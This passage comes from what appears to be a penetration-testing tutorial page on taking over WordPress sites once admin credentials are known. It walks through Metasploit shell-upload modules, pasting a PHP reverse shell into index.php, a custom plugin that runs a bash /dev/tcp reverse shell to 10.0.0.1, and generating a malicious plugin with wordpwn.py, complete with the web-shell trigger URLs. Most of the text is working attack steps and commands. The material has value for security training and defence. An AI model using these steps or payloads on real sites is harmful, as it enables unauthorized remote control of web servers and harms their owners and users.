+<p>The first method involves using the Metasploit framework. This module requires an administrator username and password, logs into the admin panel, and uploads a payload packaged as a WordPress plugin. Because this is an authenticated code execution by design, it should work on all versions of WordPress, resulting in a Meterpreter session to the webserver.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">msf </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> use exploit/unix/webapp/wp_admin_shell_upload</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">wp_admin_shell_upload</span><span class="enlighter-g1">)</span> <span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set USERNAME admin</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">wp_admin_shell_upload</span><span class="enlighter-g1">)</span> <span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set PASSWORD admin</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">wp_admin_shell_upload</span><span class="enlighter-g1">)</span> <span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set targeturi /wordpress</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">wp_admin_shell_upload</span><span class="enlighter-g1">)</span> <span class="enlighter-g1">&gt;</span><span class="enlighter-text"> exploit</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>Great! It works perfectly, and as you can see, we have successfully obtained a reverse connection to the web server via a Meterpreter session.</p>
+<h3>Injecting Malicious code</h3>
+<p>Another technique to spawn web server shells involves injecting malicious code. If you have an administrator&rsquo;s username and password, log in to the admin panel and inject malicious PHP code into the index.php file, which is the entry point of the website.</p>
+<p>To do this, navigate to the WordPress dashboard, click on &ldquo;Plugins&rdquo; in the left-hand menu, and then click &ldquo;Add New.&rdquo;</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9o0_ktAAKW7Vt6VcU70y-QjcKRZnW7To7YVP0RnfTkIQ5abxZpyFDWZutaoqw8_0jnthU-1tmtmErZWRG7HYAB7HQAf3wVg0UCElbAaFJ1ZUw0beMd2ywwgmvm746IIraPeuQfQfI-fV1AdG3LRVQF69SriPrI-kh8Gu724uVKVviG6tEb0QaT5AcuWj0/s16000/3.png" alt="" /></p>
+<p>In the search bar, type &ldquo;Advanced File Manager&rdquo; and locate the plugin by &ldquo;modalweb.&rdquo;</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOYnRb9zwXScxdwUmNu-X-uYn8pjbYsMlPTywRAaJtHf2NihHRG_zB0b_N8HVIJ_ydN57K3w4KgiinNn5aGU58nOjWxs5qJYRrEQeyTQeccujpR4U3QE0bY5VG47kcTV7jOwNTZRFd3zPL9PMVTzO84BvWvQNFqpmTXTmTbqG7eVYfSx_KoDWtwd3fPQWj/s16000/4.png" alt="" /></p>
+<p>Install and Activate the Plugin:</p>
+<p>Click &ldquo;Install Now&rdquo; and then &ldquo;Activate&rdquo; to enable the plugin on your WordPress site.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRaYvE4pEPkUx7cV4ntvkh_Fw5eK1YmWAUXYswrJcDBmItmmobudVgfEPJ6KuDq2dLSJprLa88KCsW5c9u1IzCDEmlyHLyH0okkZiFo39rse-BDsW7bufTWDzGaLcBbUh0RxwqpfGNzIWQOEpcDdsklP-a3gZ_-_epEhTlZKtFim_80f722XC8qxFiAY1u/s16000/5.png" alt="" /></p>
+<p>Once activated, go to the &ldquo;File Manager&rdquo; option in the left-hand menu.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheBqhKQ0e18wtki7cqAHtY8VG8WUbtOt40CxaKxRrbuaPlRU145aKF_gkv9L4wFMYLiKAF1_In3JnwDqBXdh77i_GQ5UNLBfn7-yZle3aCnHj_iuThn4NXWpf7pILC9vTg1xE76CP-_hMD3vJ73fN_5JeexOcWYdcBL8ZPPNvFVSxwNgdblTeHuIr9I1eP/s16000/6.png" alt="" /></p>
+<p>Use the file manager to navigate the file system of your WordPress installation. This interface allows you to view, upload, and edit files directly.</p>
+<p>In WordPress, right-click on index.php and select &ldquo;Edit.&rdquo; Before making any changes, create a duplicate of the file so that you can restore it later if needed.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHc4wO8EVOq3guSBStpvADYKTlvfknhpASYPw4CC9I5ZkXct6NXbRUxOXmZzroGebe92wk6W-zi142bmSVR5sRN9B3E8Kd5Tc9zhUrQ9fLifutx-q06r6plQak9jUv5CSozXbdGq7ox5tCpqAhJ6gnOk5ehMCdowaq3oD3nv8Yxw5XpEfKdQtkeK8T9MN0/s16000/7.png" alt="" /></p>
+<p>On kali, open and copy the code from /usr/share/webshells/php/php-reverse-shell.php</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSv1_jmxGQID97TuGQ2xb2U7wMgxTRRY2i5aEP6CNlh8dDMPa50LtH2LQwUgSbWzjJzKnLiCCrs0vg1t1fCbFOWKYHQXYMUB0KLgjYSXCetYo73ojPspsmwEFbYnSvLdDvW2RIhP7GvtJoc27JgdZ8iDTM7gqaInYLMiwr7si08v-g5dtPhVPnKqD1rHEx/s16000/8.png" alt="" /></p>
+<p>Paste the following code into the index.php file, updating the IP address with your Kali machine&rsquo;s IP and the port number. Then click the &lsquo;Save and Close&rsquo; button.</p>
+<p>Next, open a terminal on your Kali machine and start Netcat:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">rlwrap nc -lvnp </span><span class="enlighter-n1">1234</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMddRSxQxq0kBW5Jlk_-Z_kbp2UHDRnpyrRDtqU_USvxfNf5EMRmsPXmfUSIYf2Ku3sqgf5ZY02nLCPCxQ6CFBT6DxIwVmtfyM5Cw9gDBRV3vH870r3YfeRp1CWfh0XDFay1g-kLgrMphnA8w1TeSXTbNwkCKRIM2iGydVm5mTmGIitJXj-7o943LgaOVb/s16000/9.png" alt="" /></p>
+<p>Try accessing the wordpress page in another browser tab which should get us the reverse shell.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgt_RQvagh8po0C2GKf-jaSQX6UrP4s-5rbVxach9WWPfUUw5mqJX845edTn4ZpEodQh-HyjD2xAWcxOag9Kp38Zkp_xFyCreWmWY2GXPAAndF_eyDjlxn9eLam2dS4cCWZK88CL9ecwYUXY1Hquy8UGZbmIa4eMNmr-bNKs6GE7mmmF8AJ7PdXPJxqsj9w/s16000/10.png" alt="" /></p>
+<h3>Inject Malicious Plugin</h3>
+<p>Sometimes, logged-on users may not have the necessary write permissions to modify the WordPress theme. In such cases, injecting a malicious WP plugin is an alternative strategy for acquiring a web shell.</p>
+<p>Once you have access to the WordPress dashboard, you can attempt to install a malicious plugin. In this example, I have already downloaded a vulnerable plugin from Exploit DB.</p>
+<p>Click&nbsp;here&nbsp;to download the plugin for practice.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjL2gPiCQFXLi41mq72gaVH95jJaFJSHB65uGGplC18PXGJbFOx7CTHEpVMAKKL29Ti7lhMvoZYx0AXhrJUedSg4GojqEge94LPPb2yL6zeuyiI258U8AI7fCEhFC9wPqwdoVSX0UTXmrtMW2OqH6sMzUrnVUCQzOJ56gPUBX7qQ8PG6PhNk0lDOuU-xg9G/s16000/11.png" alt="" /></p>
+<p>Now that we have the ZIP file for the plugin, it&rsquo;s time to upload it.</p>
+<p>Dashboard &gt; plugins &gt; upload plugin</p>
+<p>In the &ldquo;Plugins&rdquo; menu, click &ldquo;Add New&rdquo; and then &ldquo;Upload Plugin&rdquo;. Choose your malicious plugin ZIP file and click &ldquo;Install Now&rdquo;.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj6ishxtwEgYLnexVwqD70_mQEETkAlnt25-elsNQ3DAjFS4J4bxMWLkfJokr13DO60ryzKkrkphbrQlWSNnmi_SEAtV-nOGzU54zeCvsKE9tNFzMK_El8OtlxylWDuidcF8Q4QnSfu-euZxfdJ0hkWO6S1g2a26g6h0KklngiKSM7ZWO7NiXUPZaeDF-03/s16000/12.png" alt="" /></p>
+<p>After uploading, click &ldquo;Activate&rdquo; to enable the plugin.</p>
+<p>Once everything is properly set up, you can proceed with exploitation. We have installed a vulnerable plugin called &ldquo;reflex-gallery,&rdquo; which is known to be easily exploitable.</p>
+<p>To exploit this vulnerability, you can use the Metasploit framework. Load the following module and execute the provided command:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">use exploit/unix/webapp/wp_reflexgallery_file_upload</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set rhosts </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">31</span><span class="enlighter-text">.</span><span class="enlighter-m3">205</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set targeturi /wordpress</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">exploit</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglNHJTSPSNh9JVtOxfCeOVe_biZV3Zh7Z3h6okGvGwiE8SBb-fPKETuPeh1_daWFpcUNUAu24GqXR9kJ1l_r3dHOEio0p-T52C7AJIIka38fs1yL3z1480hM3qU8ZRP9j0UjBow7zxAc27GVk0FIQcgfpkCsc00a1WJrRlaxLgoS8wUCdO9bpDHRnb7lBz/s16000/13.png" alt="" /></p>
+<p>After executing the above commands, you will establish a Meterpreter session. As demonstrated in this guide, there are various methods to exploit a website built on the WordPress platform.</p>
+<h3>Inject custom Malicious Plugin</h3>
+<p>As demonstrated earlier, we uploaded a vulnerable plugin with a readily available exploit. This time, we will inject our custom-generated malicious plugin to obtain a reverse shell. The process is straightforward: we have saved the reverse shell&rsquo;s malicious code in a PHP file named &ldquo;revshell.php&rdquo; and compressed it into a ZIP file.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-m0">exec</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1'"</span><span class="enlighter-g1">)</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkx6vPKLT-vD7nYEK0ybeteLnqDi38S9P61vFeCZYnnWVOTjvJDjpZuJffm3w6qnTqv6xZSj79XJI4Lav8512vRG47RcASx_hSFCDGAqcbuqVj6HXRXAL7FZYMXN32hBoZU3ojV55Mv0V7fAugW8E2qxuA7B2ctLnlNVvFvBBM6Tf1Vb1cxhfw9Bo2gLzI/s16000/15.png" alt="" /></p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO7cFb6_7ERx1za1r7fGv-yC0VT3cjgnPY5sSAEbPUSGLKrik9G-W0xH-EfR4I3AzOSFEEbDV0x94tTS7onx860Zf7hNOCcmeUdB3jZhG36X2lrw226VjwSltROf6ZhUj-R4A-7tlmYzpdIKLT17dMId1fvSbfmHD_-SbOEfCjU2o6tE6vu2DPauyyYZq7/s16000/16.png" alt="" /></p>
+<p>Repeat the previous steps to upload the &ldquo;revshell.zip&rdquo; plugin file, then start a Netcat listener to establish a reverse connection to the target machine.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaYaAI1w4cID_c-v4qILMMqS2btj8dDOS-imHRkfDxFtL552MYbdJ50CVx4dOeYvysNakI62Z3X5Fut7P2lipDhyphenhyphenxSfUj6jhgDgkZ4xkkUCHkqoABj06xPqy5EDIzApWCjL2foTlUcC0MEzv9toNEJaMwNsnq3P6xfU-J8_qehHr6DJhXXNn1HvXe3LiDb/s16000/17.png" alt="" /></p>
+<p>Once the package gets installed successfully, we need to activate the plugin.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6l0gNokUlOZmXH9oWNN1phqsk355TYNZgc2VVk9P63VFpvshYmFVkLhMElD4dJNPKCdRrmuwWqMeZmB6ilxzn7apD8ve7UprVyB34KRPAMD9mHUqKDMUyVeA3ad754b9x8PNll6__O45cwrGBI6jI4mJloNCl3YwFt6t4nMB-y-9aZw9aArZZIEj_9-iC/s16000/18.png" alt="" /></p>
+<p>As soon as you activate the plugin, it will establish a reverse connection, creating a Netcat session.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiemW7YKPPQJlrBCqezVdkHXyTApVGBsp2kgJUPwMVlAycvf8Wsf2wblEjY5wdu5IJcfoRVKBsvGbJIb7QwBc1CVm_C0jVyrmJL4YVyVpxL52S96KIx2hykFhDn1ihJ-sD9WiLP7VZN4a_pKdf-8sWKRUgYnShsrj0mOggbgP8IFJwpNA0kBnNWP3e3346L/s16000/19.png" alt="" /></p>
+<h3>WetW0rk &ndash; Malicious WordPress plugin</h3>
+<p><strong>&nbsp;</strong>First, we need to download the malicious WordPress plugin from&nbsp;<strong>GitHub</strong>. This plugin contains the code necessary to exploit the WordPress installation.</p>
+<p>Open a terminal on your Kali Linux machine and use the following command to clone the repository:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">git clone https:</span><span class="enlighter-c0">//github.com/wetw0rk/malicious-wordpress-plugin</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>Change to the directory containing the cloned repository.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9oZxjiv3YkyrLgaYLLqLl0waMFpps4u975q7WaisDWnixrSG9_UXDviCRnaG0C8oEDS_om2JrnyZjeBXdr5jNUi5lHEzZS1bmDGJEi4gnpHpuvvVBGjiu3hM-QLTP_oNnqgmdsi9OtPpUrKFvfX0C4sZ0Bw_5iF_eaLcuRDvGcGvvZl87-9-SxdXneRp6/s16000/25.png" alt="" /></p>
+<p>Next, we need to generate the malicious plugin that will be uploaded to the WordPress site to exploit it.</p>
+<p>Use the wordpwn.py script from the cloned repository to generate the plugin. Replace &lt;Kali_IP&gt; with your Kali machine&rsquo;s IP address and 8888 with the desired port number:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python wordpwn.</span><span class="enlighter-m3">py</span> <span class="enlighter-g1">&lt;</span><span class="enlighter-text">Kali_IP</span><span class="enlighter-g1">&gt;</span> <span class="enlighter-n1">8888</span><span class="enlighter-text"> Y</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidDsIdVirscnUfZJu-UzTIptm6Luki_5UtwowXiiAXAbSKhmEi8zENiDJuR5EQLd2INSc4oTD95Qb7O5kjth2TSAPHwr1O9eaKX5E1DAzZGMjwSyPSoBtJDsUdkMXRYRDv00fjSBr6pD2GlO9tkunKi14rLBQiEyJ0nOurrB38AXYs-5UXdRpIhT_-47Jk/s16000/26.png" alt="" /></p>
+<p>After running the script, make a note of the URLs provided for triggering the reverse shell. These URLs will be used later to establish the connection.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">http:</span><span class="enlighter-c0">//(target)/wp-content/plugins/malicious/wetw0rk_maybe.php</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">http:</span><span class="enlighter-c0">//(target)/wp-content/plugins/malicious/QwertyRocks.php</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">http:</span><span class="enlighter-c0">//(target)/wp-content/plugins/malicious/SWebTheme.php?cmd=ls</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This script also starts metasploit framework as part of the process and would be waiting for the reverse shell.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh06DEvSZP4hpQA91awIZwdHdLJ2MG16CQ3Z1dUO8b46EM4Lk0Yy-nXMu-h-f5YMpVILRpWSaqS7KYVfcr4ApOXSNM1MwbOQGHH9eFjltvxevhb0-OkOTQnjCEe9SReTcPpz_yIoAtTrvktd_NrEX_SJjFSnVyX_lhcHqQNG9Byq6wxraxvD9MgYiIvMXp6/s16000/27.png" alt="" /></p>
+<p>Now that we have generated the malicious plugin, we can proceed with uploading it to the WordPress site to exploit it.</p>
+<p>Upload the plugin as we did earlier.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj88yN9javsA4qV4EDuOa3UME4bx-dmC0cmLRxj7Y0L8ZTyHTK_WTluX36RgwnorMcpNehX2flnTYKf15kfBgMGkoG0xY2MZtbQvpHzAhBlb9ydxj5KxVPP5CwRD0fFEw3Q_mdPfNvedM189IluXclJ_K4LMc3Xipky63vuw_Sj0E29cOsVLxc7Bf5hJ2DY/s16000/28.png" alt="" /></p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZ1E_6PAxJCp3vGoGdiUf2LYN32gUQ9Mt8osGoyzru4E36C7cM-fc7P_S6ttd4t5pvOnYnuJZ3DtyVzuzyQw7ctG6Dzu-5qZNQzfBdWYsv2KZnfUKA-5r0Xg3YIg9-odyJlcOHC4vbg66mlT9K5R-zSqex3Cv5AQiiMPSfa2NjebRTZ8Zv0gIn14Kushx7/s16000/29.png" alt="" /></p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzcwbm5uXSI-aXHgfl33nNFLL4PkgDHcH-xr33DWMf-DTaJgx1kQ4fmFIh3BG43TWPkZ5fFXfzRHAHc15g1M-kob5kmpXFL07FtAEnc2_4GcYyDL3uXLKpWiIiYxk3YZs8zzZFAyJnL9D04ga9LVmT26BbGRXUfhanXZrBIlaIU4c5FOjJIYs_kwHFB1iI/s16000/30.png" alt="" /></p>
+</div>
+</div>
+</body>
+</html>
